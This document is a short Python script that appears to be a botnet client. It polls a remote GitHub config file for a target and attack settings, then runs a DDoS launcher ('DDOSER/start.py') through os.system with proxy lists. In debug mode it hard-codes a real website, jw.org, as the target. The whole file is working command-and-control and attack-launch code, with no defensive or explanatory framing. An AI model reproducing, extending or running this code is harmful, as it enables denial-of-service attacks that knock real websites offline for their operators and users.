import requests
import os

from time import sleep


#os.system('pip install -r requirements.txt')

DEBUG = True
METHOD,TARGET,THREADS,DURATION,SOCKS_TYPE,HASH = '','','','','','-1'


def get_config():
    global METHOD,TARGET,THREADS,DURATION,SOCKS_TYPE,HASH
    CONFIG_FILE = 'https://raw.githubusercontent.com/DenysDanov/botnet/main/cfg.json'
    req = requests.get(CONFIG_FILE).json()
    TARGET = req["base"]["target"]
    METHOD = req["base"]["method"]
    THREADS = req["base"]["threads"]
    SOCKS_TYPE = req["base"]["socks_type"]
    DURATION = req["base"]["duration"]
    HASH = req["base"]["hash"]

hash = "" 
while True:
    sleep(5)
    get_config()
    if DEBUG: print(f'python DDOSER/start.py {METHOD}  {"jw.org" if DEBUG else TARGET} {THREADS} {DURATION} {SOCKS_TYPE} socks{SOCKS_TYPE}.txt')
    if hash != HASH:
        hash = HASH
        os.system(f'python DDOSER/start.py {METHOD} {"jw.org" if DEBUG else TARGET} {THREADS} {DURATION} {SOCKS_TYPE} socks{SOCKS_TYPE}.txt {"true" if DEBUG else ""}')
    